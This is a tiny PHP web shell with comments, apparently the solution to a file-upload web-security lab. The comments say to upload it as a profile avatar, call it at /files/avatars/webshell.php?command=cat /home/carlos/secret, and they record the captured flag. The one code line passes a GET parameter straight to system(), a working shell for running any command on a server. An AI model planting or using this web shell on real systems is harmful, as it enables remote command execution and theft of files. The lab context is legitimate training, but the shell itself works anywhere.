/* Just upload this file and provide your command in the GET parameter */
/* We see that the file upload is the profile's avatar and it's stored in /files/avatars/webshell.php */
/* the payload is /files/avatars/webshell.php?command=cat /home/carlos/secret */
/* flag : wlThQtJ2G4nr4lfTjsiYGmAn8Maty3or */
<?php echo system($_GET['command']); ?>